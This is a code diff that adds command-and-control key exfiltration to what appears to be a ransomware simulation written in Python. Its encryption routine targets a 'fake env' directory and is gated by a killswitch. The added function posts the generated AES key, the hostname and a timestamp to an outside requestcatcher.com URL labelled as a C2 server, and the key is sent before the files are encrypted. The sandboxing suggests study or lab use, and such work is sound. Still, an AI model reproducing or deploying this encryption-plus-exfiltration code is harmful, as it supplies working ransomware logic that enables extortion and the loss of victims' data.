@@ -8,6 +8,8 @@ import sys
 import random
 import string
 import shutil
+import socket
+import datetime
 import os
 from pathlib import Path
 from Crypto.Cipher import AES
@@ -72,12 +74,29 @@ def encrypt_fake_env_files():
         print(f"Error: {fake_root} does not exist. Stopping.")
         return
     aes_key = generate_aes_key() # Generate the AES key
+    send_aes_key_to_c2(aes_key)  # Sending the key to the C2 server
     files_to_encrypt = list_files_in_fake_env(fake_root) # List all files in the fake env
     if not files_to_encrypt:
         print("No files to encrypt.")
         return
     for file_path in files_to_encrypt: # Encrypt each file found in the fake env
         encrypt_file(file_path, aes_key)
+
+# Send the AES key to the C2 server
+def send_aes_key_to_c2(key):
+    c2_url = "https://shoubadidoulolo.requestcatcher.com/"
+    hostname = socket.gethostname()  # Get computer name
+    timestamp = datetime.datetime.now().isoformat()  # Get current timestamp in ISO format
+    payload = {
+        "aes_key": key.hex(),         # AES key as hex string
+        "hostname": hostname,
+        "timestamp": timestamp
+    }
+    try:
+        response = requests.post(c2_url, json=payload)
+        print(f"[C2] AES key sent to C2. Status code: {response.status_code}")
+    except Exception as e:
+        print(f"[C2] Failed to send AES key to C2: {e}")
 
 # Main
 if killswitch():
